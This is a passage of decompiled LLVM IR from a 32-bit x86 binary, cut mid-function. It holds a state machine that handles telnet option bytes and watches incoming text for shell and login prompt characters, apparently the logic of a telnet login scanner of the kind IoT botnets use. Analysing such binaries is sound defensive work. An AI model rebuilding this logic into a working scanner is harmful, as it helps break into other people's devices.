  store i32 %v3_805059e, i32* %ecx.global-to-local, align 4
  %v1_80505a2 = add i32 %v0_805059e, 16
  %v2_80505a2 = inttoptr i32 %v1_80505a2 to i32*
  %v3_80505a2 = load i32, i32* %v2_80505a2, align 4
  store i32 %v3_80505a2, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_80505ab = inttoptr i32 %v3_805059e to i32*
  store i32 0, i32* %v1_80505ab, align 4
  %v0_80505b1 = load i32, i32* @edi, align 4
  %v1_80505b1 = add i32 %v0_80505b1, 24
  %v2_80505b1 = inttoptr i32 %v1_80505b1 to i32*
  %v3_80505b1 = load i32, i32* %v2_80505b1, align 4
  store i32 %v3_80505b1, i32* %edx.global-to-local, align 4
  %v0_80505b4 = load i32, i32* @esp, align 4
  %v1_80505b4 = add i32 %v0_80505b4, -4
  %v2_80505b4 = inttoptr i32 %v1_80505b4 to i32*
  store i32 16384, i32* %v2_80505b4, align 4
  %v0_80505b9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80505b9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80505b9 = add i32 %v1_80505b9, %v0_80505b9
  store i32 %v2_80505b9, i32* @ebx, align 4
  %v0_80505bb = load i32, i32* %eax.global-to-local, align 4
  %v2_80505bb = sub i32 %v0_80505bb, %v1_80505b9
  store i32 %v2_80505bb, i32* %eax.global-to-local, align 4
  %v2_80505bd = add i32 %v0_80505b4, -8
  %v3_80505bd = inttoptr i32 %v2_80505bd to i32*
  store i32 %v2_80505bb, i32* %v3_80505bd, align 4
  %v0_80505be = load i32, i32* @ebx, align 4
  %v2_80505be = add i32 %v0_80505b4, -12
  %v3_80505be = inttoptr i32 %v2_80505be to i32*
  store i32 %v0_80505be, i32* %v3_80505be, align 4
  %v0_80505bf = load i32, i32* @edi, align 4
  %v1_80505bf = add i32 %v0_80505bf, 4
  %v2_80505bf = inttoptr i32 %v1_80505bf to i32*
  %v3_80505bf = load i32, i32* %v2_80505bf, align 4
  %v2_80505c2 = add i32 %v0_80505b4, -16
  %v3_80505c2 = inttoptr i32 %v2_80505c2 to i32*
  store i32 %v3_80505bf, i32* %v3_80505c2, align 4
  %v0_80505c3 = call i32 @function_805285e()
  store i32 %v0_80505c3, i32* %eax.global-to-local, align 4
  %v0_80505c8 = load i32, i32* @esp, align 4
  %v1_80505c8 = add i32 %v0_80505c8, 16
  %tmp137 = icmp slt i32 %v0_80505c3, 1
  br i1 %tmp137, label %dec_label_pc_8050adc, label %dec_label_pc_80505d4

dec_label_pc_80505d4:                             ; preds = %dec_label_pc_805059e
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_80505d6

dec_label_pc_80505d6:                             ; preds = %dec_label_pc_80505e0, %dec_label_pc_80505d4
  %v0_80505dc = phi i32 [ %v1_80505e0, %dec_label_pc_80505e0 ], [ 0, %dec_label_pc_80505d4 ]
  %v1_80505d6 = load i32, i32* @ebx, align 4
  %v2_80505d6 = add i32 %v1_80505d6, %v0_80505dc
  %v3_80505d6 = inttoptr i32 %v2_80505d6 to i8*
  %v4_80505d6 = load i8, i8* %v3_80505d6, align 1
  %v5_80505d6 = icmp eq i8 %v4_80505d6, 0
  %v1_80505da = icmp eq i1 %v5_80505d6, false
  br i1 %v1_80505da, label %dec_label_pc_80505e0, label %dec_label_pc_80505dc

dec_label_pc_80505dc:                             ; preds = %dec_label_pc_80505d6
  store i8 65, i8* %v3_80505d6, align 1
  %v0_80505e0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80505e0

dec_label_pc_80505e0:                             ; preds = %dec_label_pc_80505d6, %dec_label_pc_80505dc
  %v0_80505e0 = phi i32 [ %v0_80505dc, %dec_label_pc_80505d6 ], [ %v0_80505e0.pre, %dec_label_pc_80505dc ]
  %v1_80505e0 = add i32 %v0_80505e0, 1
  store i32 %v1_80505e0, i32* @edx, align 4
  %v12_80505e1 = icmp eq i32 %v0_80505c3, %v1_80505e0
  %v1_80505e3 = icmp eq i1 %v12_80505e1, false
  br i1 %v1_80505e3, label %dec_label_pc_80505d6, label %dec_label_pc_80505e5

dec_label_pc_80505e5:                             ; preds = %dec_label_pc_80505e0, %dec_label_pc_8050ae2
  %v0_80505e5 = load i32, i32* @edi, align 4
  %v1_80505e5 = add i32 %v0_80505e5, 24
  %v2_80505e5 = inttoptr i32 %v1_80505e5 to i32*
  %v3_80505e5 = load i32, i32* %v2_80505e5, align 4
  %v2_80505e8 = add i32 %v3_80505e5, %v0_80505c3
  store i32 %v2_80505e8, i32* @ebx, align 4
  %v0_80505ea = load i32, i32* @global_var_80568f0.34, align 16
  store i32 %v0_80505ea, i32* %eax.global-to-local, align 4
  store i32 %v2_80505e8, i32* %v2_80505e5, align 4
  %v0_80505f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505f2 = load i32, i32* @edi, align 4
  %v2_80505f2 = add i32 %v1_80505f2, 8
  %v3_80505f2 = inttoptr i32 %v2_80505f2 to i32*
  store i32 %v0_80505f2, i32* %v3_80505f2, align 4
  br label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80508fc, %dec_label_pc_80505e5
  %v0_80505f5 = load i32, i32* @edi, align 4
  %v1_80505f5 = add i32 %v0_80505f5, 12
  %v2_80505f5 = inttoptr i32 %v1_80505f5 to i32*
  %v3_80505f5 = load i32, i32* %v2_80505f5, align 4
  store i32 %v3_80505f5, i32* %eax.global-to-local, align 4
  switch i32 %v3_80505f5, label %dec_label_pc_8050583.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8050605
    i32 3, label %dec_label_pc_8050698
    i32 4, label %dec_label_pc_8050720
    i32 5, label %dec_label_pc_8050547
    i32 6, label %dec_label_pc_80507c5
    i32 7, label %dec_label_pc_805091c
    i32 8, label %dec_label_pc_8050780
    i32 9, label %dec_label_pc_80509d3
    i32 10, label %dec_label_pc_8050810
  ]

dec_label_pc_8050605:                             ; preds = %dec_label_pc_80505f5
  %v0_8050605 = load i32, i32* @esp, align 4
  %v1_8050605 = add i32 %v0_8050605, 16
  %v2_8050605 = inttoptr i32 %v1_8050605 to i32*
  %v3_8050605 = load i32, i32* %v2_8050605, align 4
  store i32 %v3_8050605, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805060b = add i32 %v0_80505f5, 24
  %v2_805060b = inttoptr i32 %v1_805060b to i32*
  %v3_805060b = load i32, i32* %v2_805060b, align 4
  store i32 %v3_805060b, i32* %edx.global-to-local, align 4
  %v2_805060e18 = sub i32 0, %v3_805060b
  %v10_805060e22 = and i32 %v3_805060b, %v2_805060e18
  %v11_805060e23 = icmp slt i32 %v10_805060e22, 0
  %v13_805060e25 = icmp slt i32 %v2_805060e18, 0
  %v2_805061026 = icmp eq i1 %v13_805060e25, %v11_805060e23
  br i1 %v2_805061026, label %dec_label_pc_8050a23.thread, label %dec_label_pc_8050612.preheader

dec_label_pc_8050a23.thread:                      ; preds = %dec_label_pc_8050605
  br label %dec_label_pc_8050583.backedge

dec_label_pc_8050612.preheader:                   ; preds = %dec_label_pc_8050605, %dec_label_pc_805060e.backedge
  %v0_805068c126 = phi i32 [ %v0_805068c128, %dec_label_pc_805060e.backedge ], [ %v0_80505f5, %dec_label_pc_8050605 ]
  %v0_8050a1b119 = phi i32 [ %v0_805060e, %dec_label_pc_805060e.backedge ], [ 0, %dec_label_pc_8050605 ]
  %v5_8050624108 = phi i32 [ %v5_8050624109, %dec_label_pc_805060e.backedge ], [ 2, %dec_label_pc_8050605 ]
  %v1_805061e106 = phi i32 [ %v1_805060e, %dec_label_pc_805060e.backedge ], [ %v3_805060b, %dec_label_pc_8050605 ]
  %v0_8050617103 = phi i32 [ %v0_8050617104, %dec_label_pc_805060e.backedge ], [ %v0_8050605, %dec_label_pc_8050605 ]
  br label %dec_label_pc_8050612

dec_label_pc_8050612:                             ; preds = %dec_label_pc_8050612.preheader, %dec_label_pc_8050663
  %v0_805068c129 = phi i32 [ %v0_805068c126, %dec_label_pc_8050612.preheader ], [ %v0_805067a, %dec_label_pc_8050663 ]
  %v0_8050a1b = phi i32 [ %v0_8050a1b119, %dec_label_pc_8050612.preheader ], [ %v0_8050680, %dec_label_pc_8050663 ]
  %v5_8050624 = phi i32 [ %v5_8050624108, %dec_label_pc_8050612.preheader ], [ %v0_8050675, %dec_label_pc_8050663 ]
  %v1_805061e = phi i32 [ %v1_805061e106, %dec_label_pc_8050612.preheader ], [ %v3_805067a, %dec_label_pc_8050663 ]
  %v0_8050a30 = phi i32 [ %v0_8050617103, %dec_label_pc_8050612.preheader ], [ %v1_805067d, %dec_label_pc_8050663 ]
  %v0_8050612 = load i32, i32* @ebx, align 4
  %v1_8050612 = inttoptr i32 %v0_8050612 to i8*
  %v2_8050612 = load i8, i8* %v1_8050612, align 1
  %v12_8050612 = icmp eq i8 %v2_8050612, -1
  %v1_8050615 = icmp eq i1 %v12_8050612, false
  br i1 %v1_8050615, label %dec_label_pc_8050684, label %dec_label_pc_8050617

dec_label_pc_8050617:                             ; preds = %dec_label_pc_8050612
  %v1_8050617 = add i32 %v0_8050a30, 16
  %v2_8050617 = inttoptr i32 %v1_8050617 to i32*
  %v3_8050617 = load i32, i32* %v2_8050617, align 4
  %v1_805061b = add i32 %v0_8050612, 1
  store i32 %v1_805061b, i32* @esi, align 4
  %v2_805061e = add i32 %v3_8050617, %v1_805061e
  store i32 %v2_805061e, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_805061e, %v1_805061b
  br i1 %tmp297, label %dec_label_pc_8050624, label %dec_label_pc_8050684

dec_label_pc_8050624:                             ; preds = %dec_label_pc_8050617
  %v2_8050624 = inttoptr i32 %v1_805061b to i8*
  %v3_8050624 = load i8, i8* %v2_8050624, align 1
  %v4_8050624 = zext i8 %v3_8050624 to i32
  %v6_8050624 = and i32 %v5_8050624, -256
  %v7_8050624 = or i32 %v4_8050624, %v6_8050624
  store i32 %v7_8050624, i32* %eax.global-to-local, align 4
  %v11_8050627 = icmp eq i8 %v3_8050624, -1
  br i1 %v11_8050627, label %dec_label_pc_8050a18, label %dec_label_pc_805062f

dec_label_pc_805062f:                             ; preds = %dec_label_pc_8050624
  %v11_805062f = icmp eq i8 %v3_8050624, -3
  br i1 %v11_805062f, label %dec_label_pc_8050a30, label %dec_label_pc_8050637

dec_label_pc_8050637:                             ; preds = %dec_label_pc_805062f
  %v1_8050637 = add i32 %v0_8050612, 2
  store i32 %v1_8050637, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_805061e, %v1_8050637
  br i1 %tmp298, label %dec_label_pc_805063e, label %dec_label_pc_8050684

dec_label_pc_805063e:                             ; preds = %dec_label_pc_8050637, %dec_label_pc_8051003, %dec_label_pc_805100b
  %v4_805063e = phi i32 [ %v6_8050aae, %dec_label_pc_8051003 ], [ %v1_8050637, %dec_label_pc_8050637 ], [ %v4_805063e.pre, %dec_label_pc_805100b ]
  %v0_805063e = load i32, i32* @esi, align 4
  %v1_805063e = inttoptr i32 %v0_805063e to i8*
  %v2_805063e = load i8, i8* %v1_805063e, align 1
  %v3_805063e = zext i8 %v2_805063e to i32
  %v5_805063e = and i32 %v4_805063e, -256
  %v6_805063e = or i32 %v3_805063e, %v5_805063e
  store i32 %v6_805063e, i32* %eax.global-to-local, align 4
  %v11_8050640 = icmp eq i8 %v2_805063e, -3
  br i1 %v11_8050640, label %dec_label_pc_8050ac5, label %dec_label_pc_8050648

dec_label_pc_8050648:                             ; preds = %dec_label_pc_8050ab8, %dec_label_pc_805063e
  %v0_8050b36 = phi i32 [ %v0_8050abb, %dec_label_pc_8050ab8 ], [ %v0_805063e, %dec_label_pc_805063e ]
  %v0_8050648 = phi i32 [ %v6_8050abb, %dec_label_pc_8050ab8 ], [ %v6_805063e, %dec_label_pc_805063e ]
  %v1_8050648 = trunc i32 %v0_8050648 to i8
  %v11_8050648 = icmp eq i8 %v1_8050648, -5
  br i1 %v11_8050648, label %dec_label_pc_8050b36, label %dec_label_pc_8050650

dec_label_pc_8050650:                             ; preds = %dec_label_pc_8050648, %dec_label_pc_8050b36
  %v5_8050650 = phi i32 [ %v0_8050648, %dec_label_pc_8050648 ], [ %v5_8050650.pre, %dec_label_pc_8050b36 ]
  %v0_8050650 = load i32, i32* @ebx, align 4
  %v1_8050650 = add i32 %v0_8050650, 2
  %v2_8050650 = inttoptr i32 %v1_8050650 to i8*
  %v3_8050650 = load i8, i8* %v2_8050650, align 1
  %v4_8050650 = zext i8 %v3_8050650 to i32
  %v6_8050650 = and i32 %v5_8050650, -256
  %v7_8050650 = or i32 %v4_8050650, %v6_8050650
  store i32 %v7_8050650, i32* %eax.global-to-local, align 4
  %v11_8050653 = icmp eq i8 %v3_8050650, -3
  br i1 %v11_8050653, label %dec_label_pc_8050ad3, label %dec_label_pc_805065b

dec_label_pc_805065b:                             ; preds = %dec_label_pc_8050ac5, %dec_label_pc_8050650
  %v0_8050b3e = phi i32 [ %v0_8050ac8, %dec_label_pc_8050ac5 ], [ %v0_8050650, %dec_label_pc_8050650 ]
  %v0_805065b = phi i32 [ %v7_8050ac8, %dec_label_pc_8050ac5 ], [ %v7_8050650, %dec_label_pc_8050650 ]
  %v1_805065b = trunc i32 %v0_805065b to i8
  %v11_805065b = icmp eq i8 %v1_805065b, -5
  br i1 %v11_805065b, label %dec_label_pc_8050b3e, label %dec_label_pc_8050663

dec_label_pc_8050663:                             ; preds = %dec_label_pc_805065b, %dec_label_pc_8050b3e, %dec_label_pc_8050ad3
  %v0_8050663 = load i32, i32* @esp, align 4
  %v1_8050663 = add i32 %v0_8050663, -4
  %v2_8050663 = inttoptr i32 %v1_8050663 to i32*
  store i32 16384, i32* %v2_8050663, align 4
  %v1_8050668 = add i32 %v0_8050663, -8
  %v2_8050668 = inttoptr i32 %v1_8050668 to i32*
  store i32 3, i32* %v2_8050668, align 4
  %v0_805066a = load i32, i32* @ebx, align 4
  %v2_805066a = add i32 %v0_8050663, -12
  %v3_805066a = inttoptr i32 %v2_805066a to i32*
  store i32 %v0_805066a, i32* %v3_805066a, align 4
  %v0_805066b = load i32, i32* @ebp, align 4
  %v1_805066b = add i32 %v0_805066b, 3
  store i32 %v1_805066b, i32* @ebp, align 4
  %v0_805066e = load i32, i32* @edi, align 4
  %v1_805066e = add i32 %v0_805066e, 4
  %v2_805066e = inttoptr i32 %v1_805066e to i32*
  %v3_805066e = load i32, i32* %v2_805066e, align 4
  store i32 %v3_805066e, i32* %edx.global-to-local, align 4
  %v0_8050671 = load i32, i32* @ebx, align 4
  %v1_8050671 = add i32 %v0_8050671, 3
  store i32 %v1_8050671, i32* @ebx, align 4
  %v2_8050674 = add i32 %v0_8050663, -16
  %v3_8050674 = inttoptr i32 %v2_8050674 to i32*
  store i32 %v3_805066e, i32* %v3_8050674, align 4
  %v0_8050675 = call i32 @function_80528d4()
  store i32 %v0_8050675, i32* %eax.global-to-local, align 4
  %v0_805067a = load i32, i32* @edi, align 4
  %v1_805067a = add i32 %v0_805067a, 24
  %v2_805067a = inttoptr i32 %v1_805067a to i32*
  %v3_805067a = load i32, i32* %v2_805067a, align 4
  store i32 %v3_805067a, i32* %edx.global-to-local, align 4
  %v0_805067d = load i32, i32* @esp, align 4
  %v1_805067d = add i32 %v0_805067d, 16
  %v0_8050680 = load i32, i32* @ebp, align 4
  %v2_8050680 = sub i32 %v0_8050680, %v3_805067a
  %v8_8050680 = xor i32 %v0_8050680, %v3_805067a
  %v9_8050680 = xor i32 %v2_8050680, %v0_8050680
  %v10_8050680 = and i32 %v9_8050680, %v8_8050680
  %v11_8050680 = icmp slt i32 %v10_8050680, 0
  %v13_8050680 = icmp slt i32 %v2_8050680, 0
  %v2_8050682 = icmp eq i1 %v13_8050680, %v11_8050680
  br i1 %v2_8050682, label %dec_label_pc_8050684, label %dec_label_pc_8050612

dec_label_pc_8050684:                             ; preds = %dec_label_pc_805060e.backedge, %dec_label_pc_8050637, %dec_label_pc_8050617, %dec_label_pc_8050663, %dec_label_pc_8050612, %dec_label_pc_8050a30.dec_label_pc_8050684.loopexit_crit_edge
  %v0_805068c = phi i32 [ %v0_8050a94, %dec_label_pc_8050a30.dec_label_pc_8050684.loopexit_crit_edge ], [ %v0_805067a, %dec_label_pc_8050663 ], [ %v0_805068c129, %dec_label_pc_8050637 ], [ %v0_805068c129, %dec_label_pc_8050617 ], [ %v0_805068c129, %dec_label_pc_8050612 ], [ %v0_805068c128, %dec_label_pc_805060e.backedge ]
  %v0_8050684 = phi i32 [ %v0_8050684.pre.pre, %dec_label_pc_8050a30.dec_label_pc_8050684.loopexit_crit_edge ], [ %v0_8050680, %dec_label_pc_8050663 ], [ %v0_8050a1b, %dec_label_pc_8050637 ], [ %v0_8050a1b, %dec_label_pc_8050617 ], [ %v0_8050a1b, %dec_label_pc_8050612 ], [ %v0_805060e, %dec_label_pc_805060e.backedge ]
  %tmp138 = icmp slt i32 %v0_8050684, 1
  br i1 %tmp138, label %dec_label_pc_8050a23, label %dec_label_pc_805068c

dec_label_pc_805068c:                             ; preds = %dec_label_pc_8050684
  %v1_805068c = add i32 %v0_805068c, 12
  %v2_805068c = inttoptr i32 %v1_805068c to i32*
  store i32 3, i32* %v2_805068c, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050698:                             ; preds = %dec_label_pc_80505f5
  %v1_8050698 = add i32 %v0_80505f5, 24
  %v2_8050698 = inttoptr i32 %v1_8050698 to i32*
  %v3_8050698 = load i32, i32* %v2_8050698, align 4
  store i32 %v3_8050698, i32* %ecx.global-to-local, align 4
  %v1_805069b = add i32 %v3_8050698, -1
  store i32 %v1_805069b, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_805069b, 1
  br i1 %tmp139, label %dec_label_pc_80506d6, label %dec_label_pc_80506a2.preheader

dec_label_pc_80506a2.preheader:                   ; preds = %dec_label_pc_8050698
  %v7_80506a2.pre = load i32, i32* @edx, align 4
  %v2_80506a2 = add i32 %v0_80505f5, 28
  br label %dec_label_pc_80506a2

dec_label_pc_80506a2:                             ; preds = %dec_label_pc_80506a2.preheader, %dec_label_pc_80506d3
  %v7_80506a2 = phi i32 [ %v7_80506a2.pre, %dec_label_pc_80506a2.preheader ], [ %v9_80506a2, %dec_label_pc_80506d3 ]
  %v0_8050b6a = phi i32 [ %v1_805069b, %dec_label_pc_80506a2.preheader ], [ %v1_80506d3, %dec_label_pc_80506d3 ]
  %v3_80506a2 = add i32 %v2_80506a2, %v0_8050b6a
  %v4_80506a2 = inttoptr i32 %v3_80506a2 to i8*
  %v5_80506a2 = load i8, i8* %v4_80506a2, align 1
  %v6_80506a2 = zext i8 %v5_80506a2 to i32
  %v8_80506a2 = and i32 %v7_80506a2, -256
  %v9_80506a2 = or i32 %v6_80506a2, %v8_80506a2
  store i32 %v9_80506a2, i32* %edx.global-to-local, align 4
  %v10_80506a6 = icmp eq i8 %v5_80506a2, 58
  br i1 %v10_80506a6, label %dec_label_pc_8050b6a, label %dec_label_pc_80506af

dec_label_pc_80506af:                             ; preds = %dec_label_pc_80506a2
  %v10_80506af = icmp eq i8 %v5_80506a2, 62
  br i1 %v10_80506af, label %dec_label_pc_8050b6a, label %dec_label_pc_80506b8

dec_label_pc_80506b8:                             ; preds = %dec_label_pc_80506af
  %v10_80506b8 = icmp eq i8 %v5_80506a2, 36
  br i1 %v10_80506b8, label %dec_label_pc_8050b6a, label %dec_label_pc_80506c1

dec_label_pc_80506c1:                             ; preds = %dec_label_pc_80506b8
  %v10_80506c1 = icmp eq i8 %v5_80506a2, 35
  br i1 %v10_80506c1, label %dec_label_pc_8050b6a, label %dec_label_pc_80506ca

dec_label_pc_80506ca:                             ; preds = %dec_label_pc_80506c1
  %v10_80506ca = icmp eq i8 %v5_80506a2, 37
  br i1 %v10_80506ca, label %dec_label_pc_8050b6a, label %dec_label_pc_80506d3

dec_label_pc_80506d3:                             ; preds = %dec_label_pc_80506ca
  %v1_80506d3 = add i32 %v0_8050b6a, -1
  %v8_80506d3 = icmp eq i32 %v1_80506d3, 0
  store i32 %v1_80506d3, i32* %eax.global-to-local, align 4
  %v1_80506d4 = icmp eq i1 %v8_80506d3, false
  br i1 %v1_80506d4, label %dec_label_pc_80506a2, label %dec_label_pc_80506d6

dec_label_pc_80506d6:                             ; preds = %dec_label_pc_80506d3, %dec_label_pc_8050b6a, %dec_label_pc_8050698
  %v0_80506d6 = load i32, i32* @esp, align 4
  %v1_80506d6 = add i32 %v0_80506d6, -4
  %v2_80506d6 = inttoptr i32 %v1_80506d6 to i32*
  store i32 4, i32* %v2_80506d6, align 4
  %v1_80506d8 = add i32 %v0_80506d6, -8
  %v2_80506d8 = inttoptr i32 %v1_80506d8 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054cc5.46 to i32), i32* %v2_80506d8, align 4
  %v0_80506dd = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506dd = add i32 %v0_80506d6, -12
  %v3_80506dd = inttoptr i32 %v2_80506dd to i32*
  store i32 %v0_80506dd, i32* %v3_80506dd, align 4
  %v1_80506de = add i32 %v0_80506d6, 16
  %v2_80506de = inttoptr i32 %v1_80506de to i32*
  %v3_80506de = load i32, i32* %v2_80506de, align 4
  store i32 %v3_80506de, i32* %eax.global-to-local, align 4
  %v2_80506e2 = add i32 %v0_80506d6, -16
  %v3_80506e2 = inttoptr i32 %v2_80506e2 to i32*
  store i32 %v3_80506de, i32* %v3_80506e2, align 4
  %v0_80506e3 = call i32 @function_8051ca0()
  store i32 %v0_80506e3, i32* %eax.global-to-local, align 4
  %v0_80506e8 = load i32, i32* @esp, align 4
  store i32 %v0_80506e3, i32* @ebp, align 4
  %v10_80506ed = icmp eq i32 %v0_80506e3, -1
  %v1_80506f0 = icmp eq i1 %v10_80506ed, false
  br i1 %v1_80506f0, label %dec_label_pc_8050b76, label %dec_label_pc_80506f6

dec_label_pc_80506f6:                             ; preds = %dec_label_pc_80506d6
  %v1_80506f6 = add i32 %v0_80506e8, 12
  %v2_80506f6 = inttoptr i32 %v1_80506f6 to i32*
  store i32 5, i32* %v2_80506f6, align 4
  %v1_80506f8 = add i32 %v0_80506e8, 8
  %v2_80506f8 = inttoptr i32 %v1_80506f8 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054cca.47 to i32), i32* %v2_80506f8, align 4
  %v0_80506fd = load i32, i32* @edi, align 4
  %v1_80506fd = add i32 %v0_80506fd, 24
  %v2_80506fd = inttoptr i32 %v1_80506fd to i32*
  %v3_80506fd = load i32, i32* %v2_80506fd, align 4
  store i32 %v3_80506fd, i32* %eax.global-to-local, align 4
  %v2_8050700 = add i32 %v0_80506e8, 4
  %v3_8050700 = inttoptr i32 %v2_8050700 to i32*
  store i32 %v3_80506fd, i32* %v3_8050700, align 4
  %v1_8050701 = add i32 %v0_80506e8, 32
  %v2_8050701 = inttoptr i32 %v1_8050701 to i32*
  %v3_8050701 = load i32, i32* %v2_8050701, align 4
  store i32 %v3_8050701, i32* %eax.global-to-local, align 4
  %v3_8050705 = inttoptr i32 %v0_80506e8 to i32*
  store i32 %v3_8050701, i32* %v3_8050705, align 4
  %v0_8050706 = call i32 @function_8051ca0()
  store i32 %v0_8050706, i32* %eax.global-to-local, align 4
  store i32 %v0_8050706, i32* @ebp, align 4
  %v10_8050710 = icmp eq i32 %v0_8050706, -1
  %v1_8050713 = icmp eq i1 %v10_8050710, false
  br i1 %v1_8050713, label %dec_label_pc_8050b76, label %dec_label_pc_8050583.loopexit12.loopexit

dec_label_pc_8050720:                             ; preds = %dec_label_pc_80505f5
  %v1_8050720 = add i32 %v0_80505f5, 24
  %v2_8050720 = inttoptr i32 %v1_8050720 to i32*
  %v3_8050720 = load i32, i32* %v2_8050720, align 4
  store i32 %v3_8050720, i32* %ecx.global-to-local, align 4
  %v1_8050723 = add i32 %v3_8050720, -1
  store i32 %v1_8050723, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_8050723, 1
  br i1 %tmp140, label %dec_label_pc_8050755, label %dec_label_pc_805072a.preheader

dec_label_pc_805072a.preheader:                   ; preds = %dec_label_pc_8050720
  %v7_805072a.pre = load i32, i32* @edx, align 4
  %v2_805072a = add i32 %v0_80505f5, 28
  br label %dec_label_pc_805072a

dec_label_pc_805072a:                             ; preds = %dec_label_pc_805072a.preheader, %dec_label_pc_8050752
  %v7_805072a = phi i32 [ %v7_805072a.pre, %dec_label_pc_805072a.preheader ], [ %v9_805072a, %dec_label_pc_8050752 ]
  %v0_8050bbb = phi i32 [ %v1_8050723, %dec_label_pc_805072a.preheader ], [ %v1_8050752, %dec_label_pc_8050752 ]
  %v3_805072a = add i32 %v2_805072a, %v0_8050bbb
  %v4_805072a = inttoptr i32 %v3_805072a to i8*
  %v5_805072a = load i8, i8* %v4_805072a, align 1
  %v6_805072a = zext i8 %v5_805072a to i32
  %v8_805072a = and i32 %v7_805072a, -256
  %v9_805072a = or i32 %v6_805072a, %v8_805072a
  store i32 %v9_805072a, i32* %edx.global-to-local, align 4
  %v10_805072e = icmp eq i8 %v5_805072a, 58
  br i1 %v10_805072e, label %dec_label_pc_8050bbb, label %dec_label_pc_8050737

dec_label_pc_8050737:                             ; preds = %dec_label_pc_805072a
  %v10_8050737 = icmp eq i8 %v5_805072a, 62
  br i1 %v10_8050737, label %dec_label_pc_8050bbb, label %dec_label_pc_8050740

dec_label_pc_8050740:                             ; preds = %dec_label_pc_8050737
  %v10_8050740 = icmp eq i8 %v5_805072a, 36
  br i1 %v10_8050740, label %dec_label_pc_8050bbb, label %dec_label_pc_8050749

dec_label_pc_8050749:                             ; preds = %dec_label_pc_8050740
  %v10_8050749 = icmp eq i8 %v5_805072a, 35
  br i1 %v10_8050749, label %dec_label_pc_8050bbb, label %dec_label_pc_8050752

dec_label_pc_8050752:                             ; preds = %dec_label_pc_8050749
  %v1_8050752 = add i32 %v0_8050bbb, -1
  %v8_8050752 = icmp eq i32 %v1_8050752, 0
  store i32 %v1_8050752, i32* %eax.global-to-local, align 4
  %v1_8050753 = icmp eq i1 %v8_8050752, false
  br i1 %v1_8050753, label %dec_label_pc_805072a, label %dec_label_pc_8050755

dec_label_pc_8050755:                             ; preds = %dec_label_pc_8050752, %dec_label_pc_8050bbb, %dec_label_pc_8050720
  %v0_8050755 = load i32, i32* @esp, align 4
  %v1_8050755 = add i32 %v0_8050755, -4
  %v2_8050755 = inttoptr i32 %v1_8050755 to i32*
  store i32 7, i32* %v2_8050755, align 4
  %v1_8050757 = add i32 %v0_8050755, -8
  %v2_8050757 = inttoptr i32 %v1_8050757 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054cd0.48 to i32), i32* %v2_8050757, align 4
  %v0_805075c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805075c = add i32 %v0_8050755, -12
  %v3_805075c = inttoptr i32 %v2_805075c to i32*
  store i32 %v0_805075c, i32* %v3_805075c, align 4
  %v1_805075d = add i32 %v0_8050755, 16
  %v2_805075d = inttoptr i32 %v1_805075d to i32*
  %v3_805075d = load i32, i32* %v2_805075d, align 4
  %v2_8050761 = add i32 %v0_8050755, -16
  %v3_8050761 = inttoptr i32 %v2_8050761 to i32*
  store i32 %v3_805075d, i32* %v3_8050761, align 4
  %v0_8050762 = call i32 @function_8051ca0()
  store i32 %v0_8050762, i32* %eax.global-to-local, align 4
  store i32 %v0_8050762, i32* @ebp, align 4
  %v10_805076c = icmp eq i32 %v0_8050762, -1
  %v1_805076f = icmp eq i1 %v10_805076c, false
  br i1 %v1_805076f, label %dec_label_pc_8050bc7, label %dec_label_pc_8050583.loopexit12.loopexit

dec_label_pc_8050780:                             ; preds = %dec_label_pc_80505f5
  %v1_8050780 = add i32 %v0_80505f5, 24
  %v2_8050780 = inttoptr i32 %v1_8050780 to i32*
  %v3_8050780 = load i32, i32* %v2_8050780, align 4
  %v1_8050783 = add i32 %v3_8050780, -1
  store i32 %v1_8050783, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_8050783, 1
  br i1 %tmp141, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_805078c.preheader

dec_label_pc_805078c.preheader:                   ; preds = %dec_label_pc_8050780
  %v7_805078c.pre = load i32, i32* @edx, align 4
  %v2_805078c = add i32 %v0_80505f5, 28
  br label %dec_label_pc_805078c

dec_label_pc_805078c:                             ; preds = %dec_label_pc_805078c.preheader, %dec_label_pc_80507bd
  %v7_805078c = phi i32 [ %v7_805078c.pre, %dec_label_pc_805078c.preheader ], [ %v9_805078c, %dec_label_pc_80507bd ]
  %v0_8050cff = phi i32 [ %v1_8050783, %dec_label_pc_805078c.preheader ], [ %v1_80507bd, %dec_label_pc_80507bd ]
  %v3_805078c = add i32 %v2_805078c, %v0_8050cff
  %v4_805078c = inttoptr i32 %v3_805078c to i8*
  %v5_805078c = load i8, i8* %v4_805078c, align 1
  %v6_805078c = zext i8 %v5_805078c to i32
  %v8_805078c = and i32 %v7_805078c, -256
  %v9_805078c = or i32 %v6_805078c, %v8_805078c
  store i32 %v9_805078c, i32* %edx.global-to-local, align 4
  %v10_8050790 = icmp eq i8 %v5_805078c, 58
  br i1 %v10_8050790, label %dec_label_pc_8050cff, label %dec_label_pc_8050799

dec_label_pc_8050799:                             ; preds = %dec_label_pc_805078c
  %v10_8050799 = icmp eq i8 %v5_805078c, 62
  br i1 %v10_8050799, label %dec_label_pc_8050cff, label %dec_label_pc_80507a2

dec_label_pc_80507a2:                             ; preds = %dec_label_pc_8050799
  %v10_80507a2 = icmp eq i8 %v5_805078c, 36
  br i1 %v10_80507a2, label %dec_label_pc_8050cff, label %dec_label_pc_80507ab

dec_label_pc_80507ab:                             ; preds = %dec_label_pc_80507a2
